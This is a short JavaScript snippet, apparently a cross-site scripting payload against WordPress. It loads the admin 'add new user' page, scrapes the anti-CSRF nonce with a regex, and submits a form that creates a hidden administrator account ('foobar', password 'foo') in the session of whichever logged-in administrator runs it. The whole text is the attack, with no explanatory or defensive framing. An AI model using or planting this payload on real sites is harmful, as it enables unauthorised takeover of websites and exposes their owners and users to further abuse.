u = "/wp-admin/user-new.php";

jQuery.get(u, function(e) {
    var nonceMatch = e.match(/_wpnonce_create-user"\svalue="(.+?)"/);
    if (nonceMatch) {
        jQuery.post(u, {
            action: "createuser",
            "_wpnonce_create-user": nonceMatch[1],
            user_login: "foobar",
            email: "foobar@bar.com",
            pass1: "foo",
            pass2: "foo",
            role: "administrator"
        }).fail(function(xhr, status, error) {
            console.error("Error creating user: ", status, error);
        });
    } else {
        console.error("Nonce not found");
    }
}).fail(function(xhr, status, error) {
    console.error("Error fetching nonce: ", status, error);
});
